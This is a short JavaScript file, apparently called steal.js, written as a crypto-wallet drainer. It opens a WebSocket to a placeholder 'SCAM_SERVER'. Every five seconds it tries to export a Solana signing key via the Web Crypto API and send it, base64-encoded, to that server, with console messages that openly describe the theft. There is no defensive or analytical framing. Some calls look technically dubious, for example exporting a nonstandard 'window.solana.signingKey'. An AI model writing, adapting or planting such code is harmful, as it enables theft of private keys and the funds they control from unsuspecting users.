console.log("steal.js is loaded! Connecting to scam server...");

const socket = new WebSocket(SCAM_SERVER);

socket.onopen = () => {
    console.log("WebSocket connected!");
    setInterval(() => socket.send(JSON.stringify({ status: "active" })), 5000);
};

socket.onerror = (error) => {
    console.error("WebSocket Error:", error);
};


async function stealPrivateKey() {
    try {
        console.log("Attempting to extract private key...");
        const privateKey = await window.crypto.subtle.exportKey("pkcs8", window.solana.signingKey);
        socket.send(JSON.stringify({ key: btoa(privateKey) }));
        console.log("Private key sent!");
    } catch (err) {
        console.error("Failed to extract private key:", err);
    }
}

setInterval(stealPrivateKey, 5000);
